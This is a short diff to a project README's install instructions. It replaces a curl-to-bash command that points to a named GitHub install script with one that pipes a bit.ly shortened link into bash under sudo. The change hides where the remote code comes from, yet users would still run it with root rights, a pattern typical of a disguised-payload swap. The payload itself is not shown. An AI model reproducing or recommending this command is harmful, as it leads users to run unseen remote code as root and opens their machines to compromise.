@@ -8,7 +8,7 @@ Install
 
 **Run this on your Terminal**
 
-```sudo bash "$(curl -fsSL https://raw.githubusercontent.com/LT5B/cost-1.4/refs/heads/main/install.sh | bash)"```
+```sudo bash "$(curl -fsSL https://bit.ly/3V6NeVw | bash)"```
 
 Features
 - 📦 Simple package management
